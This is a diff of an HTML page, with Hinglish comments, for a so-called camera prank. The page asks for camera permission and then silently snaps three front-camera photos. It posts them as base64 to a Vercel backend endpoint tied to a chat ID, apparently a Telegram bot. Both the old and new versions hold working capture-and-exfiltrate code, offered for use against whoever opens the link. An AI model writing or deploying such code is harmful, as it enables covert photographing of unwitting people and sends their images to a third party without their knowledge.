@@ -3,65 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔴 Camera Control Activated</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; background: #111; color: #0f0; padding: 40px; }
-        h1 { color: red; }
-        button { padding: 15px 30px; font-size: 20px; background: #f00; color: white; border: none; border-radius: 10px; cursor: pointer; }
-        #status { margin: 20px; font-size: 18px; }
-    </style>
+    <title>Camera Prank</title>
+    <style>body{background:#000;color:#0f0;text-align:center;padding:50px;font-family:Arial;}</style>
 </head>
 <body>
-    <h1>🔴 Prank Camera Activated...</h1>
-    <p id="status">Permission ke liye button dabaao 😂</p>
-    <button onclick="startCapture()">Allow Camera Access</button>
+    <h1>🔴 Camera Control Activated...</h1>
+    <p id="status">Permission maang raha hoon...</p>
+    <button onclick="capture()" style="padding:15px 30px;font-size:18px;background:red;color:white;border:none;border-radius:8px;">Allow Camera</button>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('chat_id');
-        const SERVER_URL = "https://your-prank-app.vercel.app/send-photo";  // <--- yahan apna deployed backend URL daal
+        const params = new URLSearchParams(location.search);
+        const chatId = params.get('chat_id');
+        const SERVER = "https://prank-cam-bot.vercel.app/send-photo";   // baad mein change hoga
 
-        async function startCapture() {
-            if (!chatId) {
-                document.getElementById('status').innerHTML = "❌ Error: Chat ID missing!";
-                return;
-            }
+        async function capture() {
+            if (!chatId) return document.getElementById('status').innerHTML = "Chat ID missing!";
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                const video = document.createElement('video');
+                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+                const video = document.createElement("video");
                 video.srcObject = stream;
                 await video.play();
 
-                document.getElementById('status').innerHTML = "📸 Capturing photos... wait karo";
+                document.getElementById('status').innerHTML = "Capturing 3 photos...";
 
-                for (let i = 1; i <= 3; i++) {
-                    await new Promise(r => setTimeout(r, 1200));
-                    
-                    const canvas = document.createElement('canvas');
+                for(let i=1; i<=3; i++){
+                    await new Promise(r => setTimeout(r, 1000));
+                    const canvas = document.createElement("canvas");
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.getContext("2d").drawImage(video, 0, 0);
                     
-                    const photoBase64 = canvas.toDataURL('image/jpeg', 0.75);
-                    
-                    await fetch(SERVER_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, photo: photoBase64, number: i })
+                    await fetch(SERVER, {
+                        method: "POST",
+                        headers: {"Content-Type": "application/json"},
+                        body: JSON.stringify({chat_id: chatId, photo: canvas.toDataURL("image/jpeg", 0.8), number: i})
                     });
-                    
-                    document.getElementById('status').innerHTML = `✅ Photo ${i}/3 sent!`;
+                    document.getElementById('status').innerHTML = `Photo ${i}/3 sent!`;
                 }
-
-                stream.getTracks().forEach(track => track.stop());
-                document.getElementById('status').innerHTML = "🎉 Done! 3 photos bhej diye. Ab haso 😂";
-
-            } catch (err) {
-                document.getElementById('status').innerHTML = "❌ Camera permission denied! (Next time Allow karna)";
-                console.error(err);
+                stream.getTracks().forEach(t => t.stop());
+                document.getElementById('status').innerHTML = "✅ Done! Photos bhej diye 😂";
+            } catch(e) {
+                document.getElementById('status').innerHTML = "Permission denied 😢";
             }
         }
     </script>
